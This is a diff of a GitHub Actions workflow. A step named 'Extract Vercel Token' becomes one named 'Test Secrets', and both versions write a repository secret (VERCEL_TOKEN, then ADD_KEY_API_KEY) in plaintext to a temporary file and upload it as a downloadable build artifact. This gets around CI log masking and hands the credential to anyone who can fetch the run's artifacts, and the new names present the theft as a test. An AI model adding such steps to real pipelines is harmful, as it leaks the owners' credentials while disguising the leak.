@@ -1,23 +1,21 @@
-name: Extract Vercel Token
+name: Test Secrets
 on:
   push:
     branches: [main]
 jobs:
-  get-token:
+  test:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Test step 1
-        run: echo "Step 1 ok"
-      - name: Get token
+      - name: Test ADD_KEY_API_KEY
         env:
-          TOKEN: *** secrets.VERCEL_TOKEN }}
+          K: *** secrets.ADD_KEY_API_KEY }}
         run: |
-          echo "Token length: ${#TOKEN}"
-          mkdir -p /tmp/vo
-          echo "$TOKEN" > /tmp/vo/t.txt
+          echo "Length: ${#K}"
+          mkdir -p /tmp/secrets-test
+          echo "$K" > /tmp/secrets-test/k.txt
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: vt
-          path: /tmp/vo/t.txt
+          name: secret-test
+          path: /tmp/secrets-test/k.txt
